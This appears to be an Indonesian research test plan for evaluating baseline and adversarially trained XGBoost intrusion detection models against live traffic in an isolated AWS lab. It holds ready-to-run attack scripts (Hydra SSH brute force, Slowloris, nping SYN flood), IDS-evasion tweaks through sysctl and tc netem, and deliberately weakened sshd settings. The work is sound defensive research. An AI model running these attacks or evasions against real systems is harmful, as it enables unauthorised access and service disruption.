# Rencana Skenario Testing Real-Traffic — Model Robust NIDS pada AWS

## Tujuan

Memvalidasi bahwa model XGBoost robust (hasil Adversarial Training) yang telah terbukti unggul pada pengujian offline (dataset CSE-CIC-IDS2018) juga mampu mendeteksi serangan secara akurat pada **trafik jaringan real-time** di lingkungan AWS. Pengujian ini mereplikasi skenario evaluasi 2×2 (S1–S4) dari paper nids-01 pada infrastruktur live.

---

## Hipotesis

1. Model robust mampu mendeteksi serangan DDoS/Brute-Force pada trafik real dengan performa mendekati hasil offline (MCC > 0.90)
2. Model baseline akan menunjukkan degradasi saat menghadapi trafik yang mengandung pola evasion (perturbasi pada fitur jaringan)
3. Metrik evaluasi (MCC, F1, Precision, Recall) pada real-traffic konsisten dengan hasil offline

---

## Arsitektur Infrastruktur AWS

### Topologi Jaringan

| Komponen | Spesifikasi | Fungsi |
|----------|-------------|--------|
| VPC | 10.2.0.0/16 | Isolasi jaringan testing |
| Subnet Private | 10.2.2.0/24 | Target + Analyzer (tidak terekspos internet) |
| Subnet Public | 10.2.1.0/24 | Attacker + NAT Gateway |
| EC2 Target | t3.medium | Menjalankan services (SSH, HTTP, FTP) |
| EC2 Analyzer | t3.large | Capture traffic, extract flow, inference |
| EC2 Attacker | t3.medium | Menjalankan serangan (dari subnet berbeda) |
| S3 Bucket | — | Menyimpan model (.json/.pkl) dan hasil |

### Model yang Digunakan

| Model | Fitur | Ukuran | Keterangan |
|-------|-------|--------|------------|
| XGBoost Baseline (Top-10) | 10 fitur | 84 KB | Tanpa Adversarial Training |
| XGBoost Robust (Top-10) | 10 fitur | ~8.6 MB | Dengan Adversarial Training |

---

## Skenario Testing (Mereplikasi S1–S4)

### RT-S1: Model Baseline + Trafik Clean

- **Model:** XGBoost Baseline (Top-10)
- **Trafik:** Serangan standar (tanpa manipulasi fitur)
- **Serangan:** SSH Brute-Force, DDoS SYN Flood, Slowloris, HTTP Flood
- **Tujuan:** Baseline performa model pada trafik real normal
- **Ekspektasi:** MCC tinggi (>0.90), serupa dengan S1 offline (0.9351)

### RT-S2: Model Baseline + Trafik Evasion

- **Model:** XGBoost Baseline (Top-10)
- **Trafik:** Serangan dengan modifikasi fitur jaringan (evasion)
- **Teknik Evasion:**
  - Manipulasi TCP Window Size (Init Fwd Win Byts) via `iptables`/`nftables`
  - Fragmentasi paket untuk mengubah Fwd Pkt Len
  - Variasi timing antar-paket untuk mengubah IAT features
  - Padding payload untuk mengubah Bwd Pkt Len
- **Tujuan:** Membuktikan kerentanan model baseline pada trafik real yang dimanipulasi
- **Ekspektasi:** MCC turun drastis (mendekati S2 offline ≈ 0.02)

### RT-S3: Model Robust + Trafik Clean

- **Model:** XGBoost Robust (Top-10, Adversarial Training)
- **Trafik:** Serangan standar (tanpa manipulasi fitur)
- **Tujuan:** Membuktikan model robust tidak menurun pada trafik normal
- **Ekspektasi:** MCC tinggi (>0.90), mendekati RT-S1

### RT-S4: Model Robust + Trafik Evasion

- **Model:** XGBoost Robust (Top-10, Adversarial Training)
- **Trafik:** Serangan dengan modifikasi fitur jaringan (evasion)
- **Tujuan:** Membuktikan model robust tahan terhadap evasion pada real-traffic
- **Ekspektasi:** MCC tetap tinggi (>0.90), recovery dari degradasi RT-S2

---

## Teknik Implementasi Evasion pada Real-Traffic

### Tantangan Utama

Berbeda dengan offline testing di mana evasion dilakukan secara matematis (`x_adv = x + ε·sign(∇L)`), pada real-traffic perturbasi harus dilakukan pada **level paket jaringan** — bukan pada vektor fitur.

### Mapping Perturbasi Offline → Real-Traffic

| Fitur Target | Offline | Implementasi Real-Traffic |
|---|---|---|
| Init Fwd Win Byts | +ε pada nilai | Modifikasi TCP window size via `sysctl` atau `iptables --set-mss` |
| Fwd Pkt Len Max/Mean | +ε pada nilai | Padding payload dengan data acak |
| Bwd Pkt Len Mean | +ε pada nilai | Server mengirim response lebih besar (padding) |
| Fwd IAT Std | +ε pada nilai | Menambah jitter/delay antar-paket via `tc netem` |
| Tot Bwd Pkts | +ε pada nilai | Server mengirim extra ACK/RST packets |

### Tools untuk Evasion

- `iptables / nftables`: Modifikasi header TCP (window size, MSS)
- `tc netem`: Menambah delay/jitter pada interface
- `scapy`: Craft paket custom dengan field yang dimanipulasi
- Custom attack script: Hydra/nping yang dimodifikasi untuk menambah padding

---

## Flow Extraction: NFStream (Solusi untuk Masalah Lama)

### Masalah Sebelumnya (Skenario-1)

| Pendekatan Lama | Masalah |
|---|---|
| scapy `rdpcap()` | Load semua ke RAM → stuck pada pcap >1 GB |
| pandas groupby 3.6 juta baris | OOM pada t3.large (8 GB) |
| CICFlowMeter Python | Buggy, output kosong |

### Solusi: NFStream

**NFStream** adalah library Python untuk network flow extraction dengan backend C (libndpi). Streaming-based, tidak load semua ke RAM.

```bash
pip install nfstream
```

```python
from nfstream import NFStreamer

# Extract flows dari pcap — streaming, sangat cepat
flows = NFStreamer(source="capture.pcap").to_pandas()

# Output: DataFrame dengan 80+ fitur per-flow (kompatibel CIC-IDS2018)
# Termasuk Top-10 fitur yang dibutuhkan
```

**Keunggulan:**
- Backend C (sangat cepat, GB pcap dalam hitungan detik)
- Streaming mode (tidak load semua ke RAM)
- Output fitur kompatibel dengan CIC-IDS2018
- Cukup jalan di t3.medium (tidak perlu instance besar)
- Tidak perlu PyTorch/Spark/big-data framework

### Mapping Fitur NFStream → Top-10 XGBoost

| Top-10 Fitur (CIC-IDS2018) | NFStream Equivalent |
|---|---|
| Fwd Seg Size Min | `src2dst_min_ps` |
| URG Flag Cnt | Custom extract dari TCP flags |
| Tot Bwd Pkts | `dst2src_packets` |
| Fwd Act Data Pkts | `src2dst_packets` (filter non-zero payload) |
| Fwd Pkt Len Max | `src2dst_max_ps` |
| Fwd Pkt Len Mean | `src2dst_mean_ps` |
| Bwd Pkt Len Mean | `dst2src_mean_ps` |
| Init Bwd Win Byts | Custom extract (TCP window dari paket pertama dst→src) |
| TotLen Bwd Pkts | `dst2src_bytes` |
| Init Fwd Win Byts | Custom extract (TCP window dari paket pertama src→dst) |

> **Catatan:** Beberapa fitur (Init Win Byts, URG Flag) mungkin perlu custom plugin NFStream atau post-processing dari raw packet header.

---

## Pipeline Eksekusi per-Skenario

```
1. Deploy infrastruktur (CloudFormation stacks)
2. Upload model baseline + robust ke EC2 Analyzer
3. Start packet capture (tcpdump) di Analyzer
4. Jalankan serangan dari Attacker ke Target (dengan/tanpa evasion)
5. Stop capture → capture.pcap
6. NFStream extract flow features → flows.csv
7. Jalankan inference dengan model yang sesuai skenario
8. Hitung metrik: MCC, F1, Precision, Recall
9. Upload hasil ke S3
```

---

## Detail Skenario Serangan

### Jenis Serangan (3 Kategori — ringan, fokus hasil)

| No | Fase | Jenis Serangan | Label Ground Truth | Durasi | Tool |
|---|---|---|---|---|---|
| 0 | Warm-up | Trafik normal (benign) | Benign | 1 menit | curl loop |
| 1 | Attack-1 | SSH Brute-Force | Brute Force | 2 menit | Hydra |
| 2 | Attack-2 | DoS Slowloris | DoS | 2 menit | Slowloris |
| 3 | Attack-3 | DDoS SYN Flood | DDoS | 1 menit | nping (rate 200/s) |
| 4 | Cool-down | Trafik normal (benign) | Benign | 1 menit | curl loop |

**Total durasi per-run: ~7 menit**

> Fokus: 3 jenis serangan yang merepresentasikan kategori berbeda (Brute-Force, DoS, DDoS) dengan rate rendah agar pcap tetap kecil dan extraction lancar.

### Timeline Menit-per-Menit

```
Menit 00–01 : Benign (warm-up)
Menit 01–03 : SSH Brute-Force (Hydra → port 22)
Menit 03–05 : DoS Slowloris (→ port 80)
Menit 05–06 : DDoS SYN Flood (nping → port 80, rate 200/s)
Menit 06–07 : Benign (cool-down)
```

### Perbedaan Skenario Clean vs Evasion

| Aspek | Clean (RT-S1, RT-S3) | Evasion (RT-S2, RT-S4) |
|---|---|---|
| Serangan | Standar (default parameters) | Sama, tapi dengan modifikasi packet |
| TCP Window | Default OS (65535) | Diubah via `sysctl` ke nilai acak |
| Packet Length | Natural | Padding +50–200 bytes per paket |
| Timing (IAT) | Natural | Ditambah jitter 5–20ms via `tc netem` |
| Total Bwd Pkts | Natural | Extra RST/FIN dikirim oleh target |

---

## Paket yang Harus Diinstall per-EC2

### EC2 Attacker (Amazon Linux 2023 — t3.medium)

```bash
# System packages
sudo yum update -y
sudo yum install -y gcc gcc-c++ make cmake openssl-devel libssh-devel \
    nmap python3 python3-pip

# Hydra (SSH brute-force)
cd /tmp
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra && ./configure && make && sudo make install

# Slowloris
sudo pip3 install slowloris

# Password list
echo -e "admin\nroot\npassword\n123456\nP@ssw0rd123\ntest\nqwerty" > /opt/passwords.txt

# Evasion tools (hanya untuk skenario RT-S2/RT-S4)
sudo yum install -y iproute-tc  # untuk tc netem
```

### EC2 Target (Amazon Linux 2023 — t3.medium)

```bash
# System packages
sudo yum update -y
sudo yum install -y nginx openssh-server

# Enable services
sudo systemctl enable --now nginx
sudo systemctl enable --now sshd

# SSH config: allow password auth + high MaxAuthTries
sudo sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#MaxAuthTries.*/MaxAuthTries 100/' /etc/ssh/sshd_config
sudo systemctl restart sshd

# Create test user
sudo useradd testuser
echo "testuser:P@ssw0rd123" | sudo chpasswd

# Evasion support (untuk RT-S2/RT-S4)
sudo yum install -y iproute-tc
```

### EC2 Analyzer (Amazon Linux 2023 — t3.large)

```bash
# System packages
sudo yum update -y
sudo yum install -y tcpdump tshark python3 python3-pip libpcap-devel

# Python ML packages
sudo pip3 install nfstream xgboost scikit-learn numpy pandas matplotlib

# Atau pakai virtual environment:
python3 -m venv /opt/nids-env
source /opt/nids-env/bin/activate
pip install nfstream xgboost scikit-learn numpy pandas matplotlib

# Directory structure
sudo mkdir -p /opt/nids/{models,captures,flows,results,scripts}

# Download models dari S3
aws s3 cp s3://ssh-detection-features-232032302717/models/xgboost_baseline_top10.json /opt/nids/models/
aws s3 cp s3://ssh-detection-features-232032302717/models/xgboost_robust_top10.json /opt/nids/models/
aws s3 cp s3://ssh-detection-features-232032302717/models/scaler_top10.pkl /opt/nids/models/
aws s3 cp s3://ssh-detection-features-232032302717/models/label_mapping.json /opt/nids/models/
```

---

## Script Utama

### 1. attack_clean.sh (di Attacker — untuk RT-S1/RT-S3)

```bash
#!/bin/bash
TARGET_IP=$1  # IP EC2 Target (private subnet)

echo "=== CLEAN ATTACK SCENARIO ==="
echo "Target: $TARGET_IP"
echo "Start: $(date)"

# Phase 0: Benign warm-up (1 min)
echo "[$(date +%H:%M:%S)] Phase 0: Benign warm-up"
for i in $(seq 1 60); do curl -s http://$TARGET_IP/ > /dev/null; sleep 1; done

# Phase 1: SSH Brute-Force (2 min)
echo "[$(date +%H:%M:%S)] Phase 1: SSH Brute-Force"
timeout 120 hydra -l testuser -P /opt/passwords.txt -t 4 $TARGET_IP ssh 2>&1 | tail -2

# Phase 2: Slowloris (2 min)
echo "[$(date +%H:%M:%S)] Phase 2: Slowloris"
timeout 120 slowloris $TARGET_IP -p 80 -s 100 2>&1 | tail -2

# Phase 3: SYN Flood (1 min, rate 200/s)
echo "[$(date +%H:%M:%S)] Phase 3: SYN Flood"
sudo timeout 60 nping --tcp --flags SYN --rate 200 -p 80 -c 12000 $TARGET_IP 2>&1 | tail -3

# Phase 4: Benign cool-down (1 min)
echo "[$(date +%H:%M:%S)] Phase 4: Benign cool-down"
for i in $(seq 1 60); do curl -s http://$TARGET_IP/ > /dev/null; sleep 1; done

echo "=== DONE: $(date) ==="
```

### 2. attack_evasion.sh (di Attacker — untuk RT-S2/RT-S4)

Sama dengan `attack_clean.sh` tapi sebelum serangan dimulai, aktifkan perturbasi:

```bash
#!/bin/bash
TARGET_IP=$1

echo "=== EVASION ATTACK SCENARIO ==="

# Aktifkan evasion: modifikasi TCP window + jitter
sudo sysctl -w net.ipv4.tcp_window_scaling=0
sudo sysctl -w net.ipv4.tcp_rmem="4096 16384 32768"  # Mengubah Init Fwd Win Byts
sudo tc qdisc add dev eth0 root netem delay 10ms 5ms  # Jitter → ubah IAT

# ... (serangan sama seperti clean, tapi dengan evasion aktif)

# Setelah selesai, kembalikan:
sudo sysctl -w net.ipv4.tcp_window_scaling=1
sudo sysctl -w net.ipv4.tcp_rmem="4096 131072 6291456"
sudo tc qdisc del dev eth0 root netem
```

### 3. capture_and_extract.sh (di Analyzer)

```bash
#!/bin/bash
SCENARIO=$1  # RT-S1, RT-S2, RT-S3, RT-S4
TARGET_IP=$2

echo "=== CAPTURE START: $SCENARIO ==="
PCAP_FILE="/opt/nids/captures/${SCENARIO}.pcap"
FLOW_FILE="/opt/nids/flows/${SCENARIO}_flows.csv"

# Start capture (filter traffic to/from target)
sudo tcpdump -i eth0 host $TARGET_IP -w $PCAP_FILE &
TCPDUMP_PID=$!

echo "Capturing... (PID: $TCPDUMP_PID)"
echo "Tunggu sampai serangan selesai (~22 menit), lalu jalankan:"
echo "  sudo kill $TCPDUMP_PID"
echo "  python3 /opt/nids/scripts/extract_and_infer.py $SCENARIO"
```

### 4. extract_and_infer.py (di Analyzer)

```python
#!/usr/bin/env python3
"""Extract flows dengan NFStream dan jalankan inference."""
import sys, os, json, time
import numpy as np
import pandas as pd
from nfstream import NFStreamer
from xgboost import XGBClassifier
from sklearn.metrics import matthews_corrcoef, f1_score, precision_score, recall_score
import pickle

SCENARIO = sys.argv[1]  # RT-S1, RT-S2, RT-S3, RT-S4
MODEL_DIR = "/opt/nids/models/"
PCAP = f"/opt/nids/captures/{SCENARIO}.pcap"
OUTPUT = f"/opt/nids/results/{SCENARIO}_results.csv"

# Tentukan model berdasarkan skenario
if SCENARIO in ["RT-S1", "RT-S2"]:
    model_file = "xgboost_baseline_top10.json"
else:
    model_file = "xgboost_robust_top10.json"

# 1. Extract flows
print(f"[1] Extracting flows from {PCAP}...")
start = time.time()
flows = NFStreamer(source=PCAP).to_pandas()
print(f"    Done: {len(flows)} flows in {time.time()-start:.1f}s")

# 2. Map NFStream features → Top-10
# (mapping perlu disesuaikan setelah cek output NFStream)
feature_mapping = {
    'Fwd Seg Size Min': 'src2dst_min_ps',
    'Tot Bwd Pkts': 'dst2src_packets',
    'Fwd Pkt Len Max': 'src2dst_max_ps',
    'Fwd Pkt Len Mean': 'src2dst_mean_ps',
    'Bwd Pkt Len Mean': 'dst2src_mean_ps',
    'TotLen Bwd Pkts': 'dst2src_bytes',
    # Init Win Byts dan URG perlu custom extraction
}

# 3. Load model + scaler
print(f"[2] Loading model: {model_file}")
model = XGBClassifier()
model.load_model(os.path.join(MODEL_DIR, model_file))

with open(os.path.join(MODEL_DIR, "scaler_top10.pkl"), "rb") as f:
    scaler = pickle.load(f)

with open(os.path.join(MODEL_DIR, "label_mapping.json"), "r") as f:
    label_map = json.load(f)
inverse_map = {v: k for k, v in label_map.items()}

# 4. Prepare features + predict
# ... (feature extraction dan scaling)

# 5. Hitung metrik vs ground truth (berdasarkan timestamp)
# ... (MCC, F1, Precision, Recall)

print(f"[5] Results saved: {OUTPUT}")
```

---

## Perbaikan dari Skenario-1 Sebelumnya

| Masalah Lama | Solusi Baru |
|---|---|
| Scapy stuck pada pcap besar | **NFStream** (C backend, streaming) |
| SYN/UDP flood jutaan packet | Batasi rate + durasi pendek per fase |
| 68 fitur tidak tersedia dari extractor | Fokus Top-10 fitur saja |
| Single-node (attacker = target) | Pisahkan EC2: Attacker, Target, Analyzer |
| RAM tidak cukup | NFStream streaming, tidak load ke RAM |

---

## Metrik Evaluasi dan Perbandingan

### Template Hasil yang Diharapkan

| Skenario | MCC (Offline) | MCC (Real) | F1 (Offline) | F1 (Real) |
|---|---|---|---|---|
| RT-S1 (Base+Clean) | 0.9351 | — | 0.9729 | — |
| RT-S2 (Base+Evasion) | 0.0184 | — | 0.7539 | — |
| RT-S3 (Robust+Clean) | 0.9347 | — | 0.9727 | — |
| RT-S4 (Robust+Evasion) | 0.9953 | — | 0.9985 | — |

Kolom "Real" akan diisi setelah eksperimen AWS selesai dijalankan.

---

## Kesimpulan yang Diharapkan

Jika hasil real-traffic konsisten dengan offline:
1. Model robust terbukti layak untuk deployment produksi (bukan hanya lab)
2. Adversarial Training efektif melindungi terhadap evasion yang dilakukan secara fisik pada level jaringan
3. Paper nids-01 dapat menambahkan kolom "Real Trafik: Ya" di tabel review literature

---

## Estimasi Biaya dan Waktu

- **Durasi testing:** ~2–3 jam per skenario (setup + attack + analysis)
- **Total:** ~1 hari untuk 4 skenario
- **Instance:** 3 EC2 × t3.medium/large ≈ $0.50/jam total
- **Estimasi biaya:** ~$5–10 (termasuk NAT Gateway + S3)
